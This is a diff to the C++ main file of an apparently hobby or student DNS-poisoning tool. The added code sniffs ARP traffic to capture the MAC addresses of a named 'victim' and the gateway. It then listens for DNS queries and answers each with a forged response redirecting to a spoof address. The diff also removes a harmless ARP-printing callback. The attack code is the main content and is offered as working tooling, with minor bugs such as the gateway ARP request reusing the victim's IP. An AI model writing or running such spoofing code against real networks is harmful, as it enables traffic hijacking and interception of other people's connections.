@@ -11,8 +11,6 @@
 
 #include "dns.h"
 
-void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet);
-
 // get the interface name, ip of gateway and ip of victim
 // main program we need: interface name, ip of gateway, ip of victim
 // dns poison we need: domain to poison, what to poison too
@@ -28,20 +26,66 @@ int main(int argc, const char *argv[]) {
 
     struct arp_header victimArp;
     struct arp_header gatewayArp;
+    struct arp_header arpRequest;
 
+    // tmp fake spoofing address
+    struct in_addr spoofIp;
+    spoofIp.s_addr = 0xdeadbeef;
+
+    // prepare the mac variables
+    memset(victimMac, 0, ETH_ALEN);
+    memset(gatewayMac, 0, ETH_ALEN);
+
+    bool victimMacSet = false;
+    bool gatewayMacSet = false;
     NetworkEngine ipEngine(interfaceName);
 
     // start arp sniffing
-
-    // send arp request to get mac address of victim
-
-    // send arp request to get the mac address of gateway
-
-    // stop arp sniffing once victim and gateway macs are acquired
-
-    // start dns sniffing
+    ipEngine.LoopCallbacks.clear();
     ipEngine.LoopCallbacks.push_back(
         [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
+            struct arp_header *arp = (struct arp_header *)(packet + 14);
+
+            if (ntohs(arp->arp_hd) == ARPHRD_ETHER && ntohs(arp->arp_pr) == ETH_P_IP) {
+                struct in_addr *tmp = (struct in_addr *)arp->arp_spa;
+                if (tmp->s_addr == victimIp.s_addr) {
+                    for (int i = 0; i < ETH_ALEN; i++) {
+                        victimMac[i] = arp->arp_sha[i];
+                    }
+                    victimMacSet = true;
+                }
+
+                if (tmp->s_addr == gatewayIp.s_addr) {
+                    for (int i = 0; i < ETH_ALEN; i++) {
+                        gatewayMac[i] = arp->arp_sha[i];
+                    }
+                    gatewayMacSet = true;
+                }
+            }
+        });
+    ipEngine.startSniff(NetworkEngine::ARP_FILTER);
+
+    // send arp request to get mac address of victim
+    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
+    ipEngine.sendArp(arpRequest);
+
+    // send arp request to get the mac address of gateway
+    craftArpRequest(&victimIp, ipEngine.getIp(), ipEngine.getMac(), &arpRequest);
+    ipEngine.sendArp(arpRequest);
+
+    // stop sniffing for macs once they have been found
+    while (true) {
+        if (victimMacSet && gatewayMacSet) {
+            ipEngine.stopSniff();
+            break;
+        }
+    }
+
+    // start dns sniffing
+    ipEngine.LoopCallbacks.clear();
+    ipEngine.LoopCallbacks.push_back(
+        [&](const struct pcap_pkthdr *header, const unsigned char *packet) {
+            unsigned char buffer[1500];
             struct iphdr *ip;
             struct udphdr *udp;
             dnshdr *dns;
@@ -67,6 +111,23 @@ int main(int argc, const char *argv[]) {
             if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
                 return;
             }
+
+            // get dns header
+            dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
+
+            // craft the poisoned response
+            int responseSize = forgeDns(dns, &spoofIp, buffer);
+            UCharVector payload(responseSize);
+            memcpy(payload.data(), buffer, responseSize);
+
+            // get the addresses
+            struct in_addr src;
+            struct in_addr dst;
+            src.s_addr = ip->saddr;
+            dst.s_addr = ip->daddr;
+
+            // reply
+            ipEngine.sendUdp(dst, src, udp->dest, udp->source, payload);
         });
     ipEngine.startSniff(NetworkEngine::IP_FILTER);
 
@@ -82,42 +143,3 @@ int main(int argc, const char *argv[]) {
     return 0;
 }
 
-/*
- * Simple callback that just displays some basic arp fields as a proof-of-concept
- */
-void arpCallback(const struct pcap_pkthdr *header, const unsigned char *packet) {
-    int i;
-    struct arp_header *arpheader = NULL;
-    arpheader = (struct arp_header *)(packet + 14);
-
-    printf("\n\nReceived Packet Size: %d bytes\n", header->len);
-    printf("Hardware type: %s\n", (ntohs(arpheader->arp_hd) == 1) ? "Ethernet" : "Unknown");
-    printf("Protocol type: %s\n", (ntohs(arpheader->arp_pr) == ETH_P_IP) ? "IPv4" : "Unknown");
-    printf("Operation: %s\n",
-           (ntohs(arpheader->arp_op) == ARPOP_REPLY) ? "ARP Reply" : "ARP Request");
-
-    /* If is Ethernet and IPv4, print packet contents */
-    if (ntohs(arpheader->arp_hd) == ARPHRD_ETHER && ntohs(arpheader->arp_pr) == ETH_P_IP) {
-        printf("Sender MAC: ");
-
-        for (i = 0; i < 6; i++)
-            printf("%02X:", arpheader->arp_sha[i]);
-
-        printf("\nSender IP: ");
-
-        for (i = 0; i < 4; i++)
-            printf("%d.", arpheader->arp_spa[i]);
-
-        printf("\nTarget MAC: ");
-
-        for (i = 0; i < 6; i++)
-            printf("%02X:", arpheader->arp_dha[i]);
-
-        printf("\nTarget IP: ");
-
-        for (i = 0; i < 4; i++)
-            printf("%d.", arpheader->arp_dpa[i]);
-
-        printf("\n");
-    }
-}
